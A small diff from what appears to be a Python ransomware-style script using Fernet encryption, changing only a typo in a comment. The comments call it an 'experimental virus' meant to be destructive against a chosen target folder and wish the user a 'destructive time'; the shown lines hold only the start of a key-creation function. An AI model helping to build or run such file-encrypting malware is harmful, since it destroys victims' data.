@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 
 # This is an experimental virus, it's very simple yet can be very destructive if used in the right root folder and against the right target
 # DO NOT RUN THIS ON AN IMPORTANT FOLDER/COMPUTER 
-# Executing this code is on your responsible only, have fun and destructive time <3
+# Executing this code is on your responsibility only, have fun and destructive time <3
 
 def create_key():
     if os.path.exists("./key.ky"):
